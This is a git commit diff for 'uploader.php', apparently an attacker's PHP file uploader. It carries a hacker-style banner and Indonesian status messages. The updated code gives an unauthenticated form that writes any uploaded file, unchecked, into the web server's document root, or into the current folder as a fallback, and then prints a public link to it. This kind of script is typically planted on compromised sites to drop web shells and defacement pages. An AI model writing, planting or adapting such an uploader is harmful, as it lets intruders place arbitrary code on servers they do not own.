363ff4ca787909817144456ee2fc2b73f1617e51
Hasanal Bulkiah <hasanal.bulkiah501@gmail.com>
2019-03-25 23:38:23 +0700

    Update uploader.php

--- uploader.php
+++ uploader.php
@@ -1,8 +1,26 @@
-<?php  
-echo "<center><h1>xXx Monkey B Luffy xXx</h1><br><br><form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' name='upload' value='Upload!'></form>"; 
-$files = $_FILES['file']['name']; 
-if(isset($_POST['upload'])) { 
- if(@copy($_FILES['file']['tmp_name'], $files)) { 
- echo "sukses upload <b>$files</b> di folder ini"; } 
- else { echo "gagal upload"; } }  
+<?php
+echo "<center><h1>xXxMonkeyxXx</h1>";
+echo "<form method='post' enctype='multipart/form-data'>
+      <input type='file' name='idx_file'>
+      <input type='submit' name='upload' value='upload'>
+      </form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+    if(is_writable($root)) {
+        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+            $web = "http://".$_SERVER['HTTP_HOST']."/";
+            echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+        } else {
+            echo "gagal upload di document root.";
+        }
+    } else {
+        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+            echo "sukses upload <b>$files</b> di folder ini";
+        } else {
+            echo "gagal upload";
+        }
+    }
+}
 ?>
